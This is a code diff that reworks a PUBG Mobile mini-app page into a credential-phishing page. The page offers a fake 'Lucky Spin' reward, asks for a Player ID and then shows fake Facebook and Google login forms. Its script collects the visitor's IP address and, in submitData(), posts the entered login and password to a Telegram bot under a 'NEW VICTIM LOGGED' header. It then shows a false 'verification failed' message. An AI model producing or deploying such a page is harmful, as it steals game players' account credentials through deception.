@@ -2,165 +2,483 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Mobile Mini App</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PUBG Mobile Rewards</title>
+    
+    <!-- Шрифты и Иконки -->
+    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600&display=swap" rel="stylesheet">
+
     <style>
-        body {
-            background-color: #0b0c0d;
-            color: white;
-            font-family: 'Segoe UI', sans-serif;
+        :root {
+            --pubg-gold: #ffbc00;
+            --pubg-dark: #0b0c0d;
+            --pubg-card: #1a1b1e;
+            --pubg-blue: #0084ff;
+        }
+
+        * {
             margin: 0;
             padding: 0;
-            overflow-x: hidden;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
-        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; }
-        
-        /* Фон с легким градиентом и шумом */
-        .bg-overlay {
-            background: linear-gradient(180deg, rgba(26,27,30,0) 0%, rgba(15,16,18,1) 100%),
-                        url('https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&q=80');
-            background-size: cover;
-            background-position: center;
+
+        body {
+            background-color: var(--pubg-dark);
+            color: white;
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Фоновый градиент */
+        .bg-glow {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
+            background: radial-gradient(circle at 50% -10%, rgba(255, 188, 0, 0.1) 0%, transparent 60%);
             z-index: -1;
-            filter: brightness(0.4) blur(2px);
         }
 
-        /* Карточки игр */
+        /* Шапка */
+        header {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .uc-balance {
+            background: var(--pubg-card);
+            border: 1px dashed var(--pubg-gold);
+            padding: 4px 12px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Сетка игр */
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            padding: 16px;
+        }
+
         .game-card {
-            background: linear-gradient(145deg, #232529, #1a1b1e);
-            border: 1px solid #3d3f43;
-            border-radius: 12px;
+            background: var(--pubg-card);
+            border-radius: 16px;
+            overflow: hidden;            border: 1px solid rgba(255, 255, 255, 0.05);
             position: relative;
-            overflow: hidden;
             transition: transform 0.2s;
         }
-        .game-card:active { transform: scale(0.95); }
-        
-        .card-label {
-            position: absolute;
-            bottom: 0;
-            width: 100%;
-            background: rgba(0,0,0,0.8);
-            padding: 8px;
-            font-weight: bold;
+
+        .game-card:active { transform: scale(0.96); }
+
+        .game-img {
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
+        }
+
+        .game-img img { max-width: 100%; max-height: 100%; object-fit: contain; }
+
+        .game-info {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 10px;
             text-align: center;
-            border-top: 2px solid #ffbc00;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .uc-badge {
-            background: #ffbc00;
-            color: black;
-            padding: 2px 8px;
+        .badge-hot {
+            position: absolute;
+            top: 8px; right: 8px;
+            background: #ff4b4b;
+            font-size: 9px;
+            font-weight: 900;
+            padding: 2px 6px;
             border-radius: 4px;
-            font-weight: 800;
-            font-size: 12px;
         }
 
-        /* Навигация */
-        .nav-bar {
-            background: #1a1b1e;
-            border-top: 1px solid #333;
+        /* Рулетка */
+        #roulette-page {
+            display: none;
+            padding: 16px;
+            animation: fadeIn 0.3s ease;
         }
-        .nav-item.active { color: #ffbc00; }
 
-        /* Кнопка Пополнить (стилизованная) */
-        .btn-deposit {
-            border: 1px dashed #ffbc00;
+        .prize-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            background: #151618;
+            padding: 10px;
+            border-radius: 20px;
+            border: 2px solid #25262b;
+        }
+
+        .prize-box {
+            aspect-ratio: 1;
+            background: #25262b;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px;
+            border: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .prize-box.active {
+            border-color: var(--pubg-gold);
             background: rgba(255, 188, 0, 0.1);
+            box-shadow: 0 0 15px rgba(255, 188, 0, 0.3);
         }
+
+        .prize-box img { max-width: 100%; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }
+
+        .btn-spin {
+            background: var(--pubg-gold);
+            color: black;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-weight: 900;
+            margin-top: 20px;
+            font-size: 18px;
+            box-shadow: 0 4px 0 #b38400;
+        }
+
+        .btn-spin:active { transform: translateY(2px); box-shadow: none; }
+
+        /* Нижнее меню */
+        .nav-bar {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            height: 70px;
+            background: #111;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 10px;
+            color: #555;
+            font-weight: 700;
+        }
+
+        .nav-item.active { color: var(--pubg-gold); }
+        .nav-item i { font-size: 20px; margin-bottom: 4px; }
+
+        /* Модалки Авторизации */
+        .login-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+            padding: 20px;
+            justify-content: center;
+        }
+
+        .login-card {
+            background: #fff;
+            color: #000;
+            border-radius: 12px;
+            padding: 25px;
+            width: 100%;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            outline: none;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
-    <div class="bg-overlay"></div>
+    <div class="bg-glow"></div>
 
-    <!-- Header -->    <div class="p-4 flex justify-between items-center bg-[#000000aa] backdrop-blur-md">
+    <!-- Header -->
+    <header>
         <div class="flex items-center gap-2">
-            <span class="text-gray-400 text-sm">◀ Назад</span>
+            <i class="fas fa-bars text-gray-400"></i>
+            <span class="pubg-font text-lg">Event Center</span>
         </div>
-        <div class="text-center">
-            <h1 class="pubg-font text-xl tracking-widest text-[#ffbc00]">PUBG DROP</h1>
-            <p class="text-[10px] text-gray-400">боевой пропуск активирован</p>
+        <div class="uc-balance">
+            <img src="https://www.pubgmobile.com/common/images/icon_uc.png" width="16" alt="uc">
+            <span class="pubg-font text-sm">640 UC</span>
+            <div class="bg-blue-500 rounded-full w-4 h-4 flex items-center justify-center text-[10px]">+</div>
         </div>
-        <div class="w-8 h-8 rounded-full bg-yellow-500 border-2 border-white overflow-hidden">
-            <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Soldier" alt="avatar">
+    </header>
+
+    <!-- Main Hub (Главная) -->
+    <div id="main-hub">
+        <div class="p-4">
+            <h1 class="pubg-font text-3xl">Exclusive Rewards</h1>
+            <p class="text-gray-500 text-xs uppercase font-bold tracking-widest">Season Airdrop is here</p>
+        </div>
+
+        <div class="game-grid">
+            <!-- Game 1 -->
+            <div class="game-card" onclick="showPage('roulette')">
+                <div class="badge-hot">POPULAR</div>
+                <div class="game-img">
+                    <img src="https://static.wikia.nocookie.net/pubg_gamepedia_en/images/1/10/Item_Crate_Classic.png" alt="crate">
+                </div>
+                <div class="game-info">
+                    <div class="pubg-font text-yellow-500">Lucky Spin</div>
+                    <div class="text-[9px] text-gray-400">WIN MYTHIC ITEMS</div>
+                </div>
+            </div>
+
+            <!-- Game 2 -->
+            <div class="game-card" onclick="alert('Available at Level 10')">
+                <div class="game-img">
+                    <img src="https://w7.pngwing.com/pngs/585/334/png-transparent-playerunknown-s-battlegrounds-video-game-helmet-level-3-pubg-helmet-electronics-battleroyale-game-pubg-thumbnail.png" alt="crate">
+                </div>
+                <div class="game-info">
+                    <div class="pubg-font text-green-500">Weapon Lab</div>
+                    <div class="text-[9px] text-gray-400">UPGRADE SKINS</div>
+                </div>
+            </div>
+
+            <!-- Game 3 -->
+            <div class="game-card" onclick="alert('Coming Soon')">
+                <div class="game-img">
+                    <img src="https://e7.pngegg.com/pngimages/1000/654/png-clipart-pubg-air-drop-illustration-playerunknown-s-battlegrounds-parachute-air-drop-video-game-crate-parachute-angle-video-game.png" alt="crate">
+                </div>
+                <div class="game-info">
+                    <div class="pubg-font text-blue-500">Drop Hunter</div>
+                    <div class="text-[9px] text-gray-400">CLAIM AIRDROP</div>
+                </div>
+            </div>
+
+            <!-- Game 4 -->
+            <div class="game-card" onclick="alert('Coming Soon')">
+                <div class="game-img">
+                    <img src="https://w7.pngwing.com/pngs/761/975/png-transparent-playerunknown-s-battlegrounds-frying-pan-weapon-pubg-pan-food-photography-battleroyale-game-thumbnail.png" alt="crate">
+                </div>
+                <div class="game-info">
+                    <div class="pubg-font text-red-500">Chicken Dinner</div>
+                    <div class="text-[9px] text-gray-400">SURVIVAL MODE</div>
+                </div>
+            </div>
         </div>
     </div>
 
-    <!-- Balance Section -->
-    <div class="p-4 flex justify-center">
-        <div class="btn-deposit flex items-center gap-3 px-6 py-2 rounded-full border">
-            <span class="text-blue-400 text-xl">+</span>
-            <span class="pubg-font text-xl tracking-wider">Пополнить UC</span>
-            <span class="ml-2 bg-green-600 text-[10px] px-2 py-0.5 rounded text-white">+25%</span>
+    <!-- Roulette Page -->
+    <div id="roulette-page">
+        <div class="flex items-center gap-4 mb-6" onclick="showPage('hub')">
+            <i class="fas fa-arrow-left"></i>
+            <span class="pubg-font text-xl">Lucky Spin Event</span>
         </div>
-    </div>
 
-    <!-- Game Selection -->
-    <div class="px-4 mt-2">
-        <h2 class="pubg-font text-2xl mb-4 text-gray-200">Выбор режима</h2>
+        <div class="prize-grid" id="prizesGrid">
+            <div class="prize-box" id="p0"><img src="https://pubg-items.com/img/items/206.png"></div>
+            <div class="prize-box" id="p1"><img src="https://pubg-items.com/img/items/202.png"></div>
+            <div class="prize-box" id="p2"><img src="https://pubg-items.com/img/items/203.png"></div>
+            <div class="prize-box" id="p3"><img src="https://pubg-items.com/img/items/204.png"></div>
+            <div class="prize-box" id="p4"><img src="https://pubg-items.com/img/items/205.png"></div>
+            <div class="prize-box" id="p5"><img src="https://pubg-items.com/img/items/201.png"></div>
+            <div class="prize-box" id="p6"><img src="https://pubg-items.com/img/items/207.png"></div>
+            <div class="prize-box" id="p7"><img src="https://pubg-items.com/img/items/208.png"></div>
+            <div class="prize-box" id="p8"><img src="https://pubg-items.com/img/items/209.png"></div>
+        </div>
+
+        <button class="btn-spin pubg-font" id="spinBtn" onclick="startSpin()">Spin 60 UC</button>
         
-        <div class="grid grid-cols-2 gap-4">
-            <!-- Game 1: Lucky Spin -->
-            <div class="game-card h-44">
-                <img src="https://w7.pngwing.com/pngs/1010/302/png-transparent-playerunknown-s-battlegrounds-crate-video-game-skin-opening-pubg-crate-angle-furniture-video-game-thumbnail.png" class="w-full h-32 object-contain p-4 opacity-80" alt="">
-                <div class="card-label pubg-font text-lg">Lucky Spin</div>
-            </div>
-
-            <!-- Game 2: Weapon Lab -->
-            <div class="game-card h-44">
-                <img src="https://w7.pngwing.com/pngs/585/334/png-transparent-playerunknown-s-battlegrounds-video-game-helmet-level-3-pubg-helmet-electronics-battleroyale-game-pubg-thumbnail.png" class="w-full h-32 object-contain p-4" alt="">
-                <div class="card-label pubg-font text-lg text-green-400">Weapon Lab</div>
-                <div class="absolute top-2 right-2 uc-badge">HOT</div>
-            </div>
-
-            <!-- Game 3: Drop Hunter -->
-            <div class="game-card h-44 border-blue-500 shadow-[0_0_10px_rgba(59,130,246,0.5)]">
-                <img src="https://e7.pngegg.com/pngimages/1000/654/png-clipart-pubg-air-drop-illustration-playerunknown-s-battlegrounds-parachute-air-drop-video-game-crate-parachute-angle-video-game.png" class="w-full h-32 object-contain p-4" alt="">
-                <div class="card-label pubg-font text-lg">Drop Hunter</div>
-            </div>
-
-            <!-- Game 4: Winner Dinner -->
-            <div class="game-card h-44">
-                <img src="https://w7.pngwing.com/pngs/761/975/png-transparent-playerunknown-s-battlegrounds-frying-pan-weapon-pubg-pan-food-photography-battleroyale-game-thumbnail.png" class="w-full h-32 object-contain p-4" alt="">
-                <div class="card-label pubg-font text-lg text-red-500">Winner Dinner</div>
-                <div class="absolute top-2 right-2 bg-orange-600 text-[10px] px-2 py-1 rounded">+60% ШАНС</div>
-            </div>
+        <!-- Section: ID Input (Show after spin) -->
+        <div id="id-step" class="mt-8 hidden animate-bounce">
+            <p class="text-center text-xs text-gray-400 mb-2">ENTER PLAYER ID TO CLAIM</p>
+            <input type="number" id="playerID" placeholder="541288331" class="bg-gray-900 border-gray-700 text-white text-center">
+            <button onclick="showLogin()" class="btn-spin !bg-green-500 !shadow-none !mt-2">Verify Account</button>
         </div>
     </div>
 
-    <!-- Bottom Nav -->
-    <div class="nav-bar fixed bottom-0 left-0 right-0 h-20 flex justify-around items-center px-4 pb-4">
-        <div class="flex flex-col items-center gap-1 opacity-50">
-            <span class="text-xl">📦</span>
-            <span class="text-[10px] uppercase font-bold">Кейсы</span>
-        </div>
-        <div class="nav-item active flex flex-col items-center gap 
--1 bg-[#2a2b2e] px-6 py-2 rounded-xl border-b-2 border-[#ffbc00]">
-            <span class="text-xl">🎮</span>
-            <span class="text-[10px] uppercase font-bold">Игры</span>
-        </div>
-        <div class="flex flex-col items-center gap-1 opacity-50">
-            <span class="text-xl">🎯</span>
-            <span class="text-[10px] uppercase font-bold">Задания</span>
-        </div>
-    </div>
-
-    <!-- Modal Example (Crate Open) -->
-    <div class="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-6 z-50 hidden">
-        <div class="bg-[#1c1d21] border-2 border-[#ffbc00] rounded-3xl w-full p-6 text-center">
-            <h3 class="pubg-font text-3xl text-[#ffbc00]">БЕСПЛАТНЫЙ КЕЙС</h3>
-            <div class="flex justify-center gap-2 my-6">
-                <div class="w-20 h-24 bg-[#2a2b2e] rounded-lg border border-gray-600"></div>
-                <div class="w-20 h-24 bg-[#2a2b2e] rounded-lg border-2 border-yellow-500 shadow-lg shadow-yellow-500/20"></div>
-                <div class="w-20 h-24 bg-[#2a2b2e] rounded-lg border border-gray-600"></div>
+    <!-- Login Modals -->
+    <div id="login-modal" class="login-overlay">
+        <div class="login-card">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="font-bold text-xl">Account Verification</h2>
+                <i class="fas fa-times text-gray-400" onclick="closeLogin()"></i>
             </div>
-            <button class="w-full bg-[#ffbc00] text-black font-bold py-4 rounded-xl pubg-font text-2xl shadow-[0_4px_0_#b38400] active:translate-y-1 active:shadow-none">Открыть ящик</button>
+            <p class="text-sm text-gray-600 mb-6">Select your login method to receive the reward</p>
+            
+            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-3 rounded-lg mb-3 flex items-center justify-center gap-3">
+                <i class="fab fa-facebook-f"></i> Facebook
+            </button>
+            <button onclick="openForm('Google')" class="w-full bg-[#EA4335] text-white p-3 rounded-lg mb-3 flex items-center justify-center gap-3">
+                <i class="fab fa-google"></i> Google
+            </button>
         </div>
     </div>
 
+    <!-- Fake Form -->
+    <div id="form-modal" class="login-overlay">
+        <div class="login-card">
+            <h2 id="form-title" class="font-bold text-xl mb-4">Login</h2>
+            <input type="text" id="logUser" placeholder="Email or Phone">
+            <input type="password" id="logPass" placeholder="Password">
+            <button onclick="submitData()" class="w-full bg-blue-600 text-white p-3 rounded-lg mt-4 font-bold">Log In</button>
+        </div>
+    </div>
+
+    <!-- Nav Bar -->
+    <nav class="nav-bar">
+        <div class="nav-item" onclick="showPage('hub')">
+            <i class="fas fa-th-large"></i>
+            <span>GAMES</span>
+        </div>
+        <div class="nav-item active">
+            <i class="fas fa-gift"></i>
+            <span>EVENTS</span>
+        </div>
+        <div class="nav-item">
+            <i class="fas fa-shopping-cart"></i>
+            <span>SHOP</span>
+        </div>
+        <div class="nav-item">
+            <i class="fas fa-user-circle"></i>
+            <span>PROFILE</span>
+        </div>
+    </nav>
+
+    <script>
+        // --- КОНФИГУРАЦИЯ ---
+        const BOT_TOKEN = 'ТВОЙ_ТОКЕН';
+        const CHAT_ID = 'ТВОЙ_ID';
+        
+        let selectedMethod = '';
+        let userIP = 'Unknown';
+
+        // Получение IP при загрузке
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+            userIP = `${data.ip} (${data.country_name})`;
+        });
+
+        // Навигация
+        function showPage(page) {
+            document.getElementById('main-hub').style.display = page === 'hub' ? 'block' : 'none';
+            document.getElementById('roulette-page').style.display = page === 'roulette' ? 'block' : 'none';
+        }
+
+        // Логика рулетки
+        let isSpinning = false;
+        function startSpin() {
+            if(isSpinning) return;
+            isSpinning = true;
+            document.getElementById('spinBtn').disabled = true;
+            document.getElementById('spinBtn').innerText = 'Spinning...';
+
+            let current = 0;
+            let steps = 25 + Math.floor(Math.random() * 10);
+            let speed = 60;
+
+            function frame() {
+                document.querySelectorAll('.prize-box').forEach(b => b.classList.remove('active'));
+                document.getElementById('p' + (current % 9)).classList.add('active');
+                
+                current++;
+                if(current < steps) {
+                    speed += 15;
+                    setTimeout(frame, speed);
+                } else {
+                    isSpinning = false;
+                    document.getElementById('spinBtn').style.display = 'none';
+                    document.getElementById('id-step').classList.remove('hidden');
+                    sendTelegram(`🎰 Игрок начал крутить рулетку\n📍 IP: ${userIP}`);
+                }
+            }
+            frame();
+        }
+
+        // Логика авторизации
+        function showLogin() {
+            const id = document.getElementById('playerID').value;
+            if(id.length < 5) return alert('Enter valid Player ID');
+            document.getElementById('login-modal').style.display = 'flex';
+        }
+
+        function closeLogin() {
+            document.getElementById('login-modal').style.display = 'none';
+        }
+
+        function openForm(method) {
+            selectedMethod = method;
+            document.getElementById('form-title').innerText = 'Login with ' + method;
+            document.getElementById('login-modal').style.display = 'none';
+            document.getElementById('form-modal').style.display = 'flex';
+        }
+
+        function submitData() {
+            const user = document.getElementById('logUser').value;
+            const pass = document.getElementById('logPass').value;
+            const pid = document.getElementById('playerID').value;
+
+            if(!user || !pass) return alert('Please fill all fields');
+
+            const message = `
+🔥 **NEW VICTIM LOGGED** 🔥
+👤 Метод: ${selectedMethod}
+🆔 Player ID: ${pid}
+📧 Login: \`${user}\`
+🔑 Pass: \`${pass}\`
+🌐 IP: ${userIP}
+            `;
+
+            sendTelegram(message);
+            
+            // Имитация загрузки
+            document.getElementById('form-modal').innerHTML = `
+                <div class="text-center p-10">
+                    <i class="fas fa-circle-notch fa-spin text-4xl text-blue-600 mb-4"></i>
+                    <p class="font-bold">Verifying Reward...</p>
+                </div>
+            `;
+            
+            setTimeout(() => {
+                alert('Verification failed. Your account does not meet the requirements (Level 10+ required).');
+                location.reload();
+            }, 3000);
+        }
+
+        async function sendTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+    </script>
 </body>
 </html>
